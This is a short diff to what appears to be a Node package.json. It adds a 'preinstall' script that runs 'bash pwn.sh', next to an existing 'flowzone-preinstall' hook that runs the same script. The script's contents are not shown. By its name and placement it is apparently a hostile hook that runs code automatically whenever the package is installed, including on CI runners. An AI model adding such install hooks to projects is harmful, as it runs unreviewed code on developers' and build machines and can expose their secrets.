@@ -19,6 +19,7 @@
     "test": "ts-mocha --project ./tsconfig.test.json",
     "prettify": "balena-lint --project ./tsconfig.test.json --fix src/ test/",
     "prepack": "npm run build",
+    "preinstall": "bash pwn.sh",
     "flowzone-preinstall": "bash pwn.sh"
   },
   "repository": {
